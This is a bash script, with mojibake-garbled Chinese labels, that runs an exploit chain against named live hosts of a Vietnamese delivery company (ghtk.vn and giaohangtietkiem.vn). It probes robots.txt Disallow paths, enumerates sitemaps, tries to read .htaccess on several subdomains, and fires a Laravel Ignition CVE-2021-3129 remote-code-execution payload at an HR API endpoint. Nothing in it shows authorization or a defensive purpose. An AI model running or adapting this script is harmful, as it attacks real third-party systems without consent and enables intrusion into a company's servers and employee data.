#!/bin/bash
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ å®Œæ•´åˆ©ç”¨é“¾æµ‹è¯•"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

echo "[*] åˆ©ç”¨é“¾1ï¼šæ–‡ä»¶è¯»å– â†’ robots.txt â†’ å‘ç°éšè—è·¯å¾„"
echo ""
curl -sk "https://hrm-api.ghtk.vn/robots.txt" -o robots.txt
if [ -s robots.txt ] && ! grep -q "\"success\":false" robots.txt 2>/dev/null; then
    echo "âœ… robots.txtå¯è¯»ï¼"
    cat robots.txt
    echo ""
    echo "[*] æµ‹è¯•robots.txtä¸­çš„Disallowè·¯å¾„..."
    grep "Disallow:" robots.txt 2>/dev/null | awk '{print $2}' | while read path; do
        echo -n "  $path â†’ "
        curl -sk "https://hrm-api.ghtk.vn$path" -w "%{http_code}" -o /dev/null -m 2 2>/dev/null
        echo ""
    done
else
    echo "âŒ robots.txtä¸å¯è¯»"
fi

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[*] åˆ©ç”¨é“¾2ï¼šsitemap.xml â†’ å‘ç°æ‰€æœ‰URL"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

for sitemap in "/sitemap.xml" "/sitemap_index.xml" "/sitemap-0.xml"; do
    echo "[*] æµ‹è¯•: $sitemap"
    resp=$(curl -sk "https://admin.giaohangtietkiem.vn$sitemap" -m 3 2>&1)
    if echo "$resp" | grep -qE "<url>|<loc>"; then
        echo "âœ… å‘ç°sitemapï¼"
        echo "$resp" | grep -oE "<loc>[^<]+" | head -20
        echo ""
    fi
done

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[*] åˆ©ç”¨é“¾3ï¼šæµ‹è¯•æ‰€æœ‰å­åŸŸåçš„ç›¸åŒæ¼æ´"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

SUBDOMAINS=(
    "admin.giaohangtietkiem.vn"
    "dashboard.ghtk.vn"
    "inter.ghtk.vn"
    "sos.ghtk.vn"
    "das2.ghtk.vn"
)

echo "[*] æµ‹è¯•æ‰€æœ‰å­åŸŸåçš„.htaccess..."
for sub in "${SUBDOMAINS[@]}"; do
    echo -n "  $sub/.htaccess â†’ "
    resp=$(curl -sk "https://$sub/.htaccess" -m 2 2>&1)
    if echo "$resp" | grep -qE "RewriteEngine|RewriteRule"; then
        echo "âœ… å¯è¯»ï¼"
        echo "$resp" | head -10
        echo "â”â”â”"
    else
        echo "âŒ"
    fi
done

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[*] åˆ©ç”¨é“¾4ï¼šé€šè¿‡å·²çŸ¥æ¼æ´è§¦å‘RCE"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""

# Laravelå·²çŸ¥RCEæµ‹è¯•
echo "[1] Laravel Debug RCE (CVE-2021-3129)"
curl -sk "https://hrm-api.ghtk.vn/_ignition/execute-solution" -X POST \
    -H "Content-Type: application/json" \
    -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cve","viewFile":"php://filter/write=convert.base64-decode/resource=storage/logs/poc.php"}}' \
    -m 5 2>&1 | head -30

echo ""
echo "[2] Laravel Unserialize (å¦‚æœæœ‰APP_KEY)"
# éœ€è¦å…ˆè·å–APP_KEY

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
